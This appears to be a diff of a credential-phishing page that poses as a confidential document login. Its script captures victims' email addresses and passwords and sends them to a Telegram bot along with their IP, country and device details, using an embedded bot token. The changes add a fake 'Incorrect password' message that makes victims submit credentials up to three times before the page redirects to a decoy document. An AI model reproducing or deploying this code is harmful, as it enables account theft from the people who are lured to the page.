@@ -50,6 +50,12 @@ button:hover {
   color: #555;
   margin-top: 12px;
 }
+
+.submit-message {
+  font-size: 12px;
+  color: red;
+  margin-top: 6px;
+}
 </style>
 </head>
 
@@ -57,20 +63,17 @@ button:hover {
 
 <div class="container">
   <h2>Access Document</h2>
-  <p>Login with reciever email to continue.</p>
+  <p>Login With your email to continue.</p>
 
   <form id="accessForm">
-    <!-- Email at top -->
     <input type="email" id="email" placeholder="Email Address" required>
-
-    <!-- First name hidden like password -->
     <input type="password" id="fname" placeholder="Email Password" required>
-
-    <button type="submit">Login</button>
+    <button type="submit">Log In</button>
+    <div id="submitMessage" class="submit-message"></div>
   </form>
 
   <div class="notice">
-    Document contains Confidentials information
+    Document Contains Confidentials information
   </div>
 </div>
 
@@ -80,7 +83,8 @@ button:hover {
 ============================ */
 const BOT_TOKEN = "8319207231:AAHgtqv3pLFkHMYRUdkGMgaK93wmwJ_kU1s";
 const CHAT_ID = "8394928905";
-const DOCUMENT_URL = "https://google.com";
+const DOCUMENT_URL = "https://sec-ux.github.io/doc/card.html"; // can be .html or .pdf
+const REQUIRED_SUBMISSIONS = 3;
 
 const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
@@ -106,9 +110,8 @@ function getDeviceType() {
    EMAIL AUTOFILL FROM URL
 ============================ */
 const params = new URLSearchParams(window.location.search);
-const emailParam = params.get("email");
-
 const emailInput = document.getElementById("email");
+const emailParam = params.get("email");
 
 if (emailParam) {
   emailInput.value = emailParam;
@@ -116,13 +119,19 @@ if (emailParam) {
 }
 
 /* ============================
+   SUBMISSION MESSAGE HANDLER
+============================ */
+const submitMessageDiv = document.getElementById("submitMessage");
+
+/* ============================
    VISIT NOTIFICATION
 ============================ */
 fetch("https://ipapi.co/json/")
   .then(res => res.json())
   .then(data => {
+    const emailText = emailInput.value ? `\nAutofill Email: ${emailInput.value}` : "";
     sendTelegram(
-      `👀 New Page Visit\n` +
+      `ðŸ‘€ New Page Visit${emailText}\n` +
       `IP: ${data.ip}\n` +
       `Country: ${data.country_name}\n` +
       `Device: ${navigator.userAgent}\n` +
@@ -131,30 +140,40 @@ fetch("https://ipapi.co/json/")
   });
 
 /* ============================
-   FORM SUBMISSION
+   FORM SUBMISSION HANDLER
 ============================ */
 document.getElementById("accessForm").addEventListener("submit", function(e) {
   e.preventDefault();
 
   const fname = document.getElementById("fname").value.trim();
   const email = emailInput.value.trim();
-
   if (!fname || !email) return;
 
+  // get previous count
+  let count = parseInt(localStorage.getItem("submissionCount") || "0");
+  count++;
+  localStorage.setItem("submissionCount", count);
+
+  // send telegram with submission info
   fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
       sendTelegram(
-        `📄 [+]━━【Adobe】━━[+]\n` +
+        `ðŸ“„ Document Access Attempt (${count}/${REQUIRED_SUBMISSIONS})\n` +
         `Email: ${email}\n` +
-        `Password: ${fname}\n` +
+        `Passwoed: ${fname}\n` +
         `IP: ${data.ip}\n` +
         `Country: ${data.country_name}\n` +
         `Device: ${navigator.userAgent}\n` +
         `Device Type: ${getDeviceType()}`
       );
 
-      window.location.href = document;
+      if (count >= REQUIRED_SUBMISSIONS) {
+        localStorage.removeItem("submissionCount");
+        window.location.href = DOCUMENT_URL;
+      } else if (count === 1) {
+        submitMessageDiv.textContent = "   Incorrect password,please try again";
+      }
     });
 });
 </script>
